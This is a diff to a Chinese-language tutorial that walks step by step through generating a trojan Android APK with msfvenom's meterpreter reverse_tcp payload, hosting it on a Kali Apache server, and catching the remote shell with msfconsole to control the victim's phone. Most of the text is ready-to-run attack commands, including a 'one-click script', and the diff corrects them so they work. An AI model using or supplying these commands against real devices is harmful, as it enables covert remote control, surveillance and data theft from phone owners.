@@ -3,7 +3,7 @@
 步骤：
 1. SSH连接上kali<br>
 ![图像_2021-08-19_182808](https://user-images.githubusercontent.com/71908235/130053586-a06330ed-4068-409d-91dd-afdc25cb422b.png)
-2. 生成一个木马apk 命令：msfvenom -p android/meterpreter/reverse_tcp LHOST=这里填kali的IP地址 LPOST=8888 R > app.apk<br>
+2. 生成一个木马apk 命令：msfvenom -p android/meterpreter/reverse_tcp LHOST=这里填kali的IP地址 LPORT=8888 R > app.apk<br>
 4. 输入service apache2 start开启服务器服务，再输入sudo cp app.apk /var/www/html将生成的apk文件复制到html文件夹下，然后执行rm /var/www/html/index.html删除掉自带的网页<br>
 ![图像_2021-08-19_184536](https://user-images.githubusercontent.com/71908235/130055912-8b0e36ef-549f-403a-84f9-ee3ebe2c3271.png)<br>
 5. 打开msfconsole（直接粘贴至控制台即可），等待到">"字样出现时继续操作<br>
@@ -20,15 +20,15 @@
 10. 在靶机上访问Kali的IP地址，找到app.apk然后就可以在Kali上控制手机了<br>
 <br>
 一键脚本：<br>
-msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.110 LPOST=8888 R > app.apk<br>
+msfvenom -p android/meterpreter/reverse_tcp LHOST=这里写KaliIP LPOST=8888 R > app.apk<br>
 service apache2 start<br>
 sudo cp app.apk /var/www/html<br>
 rm /var/www/html/index.html<br>
 msfconsole<br>
-use exploit/multi<br>
+use exploit/multi/handler<br>
 set payload android/meterpreter/reverse_tcp<br>
-set LPORT=8888<br>
-set LHOST=192.168.1.110<br>
+set LPORT 8888<br>
+set LHOST 这里写KaliIP<br>
 exploit<br>
 <br>
 注：<br>
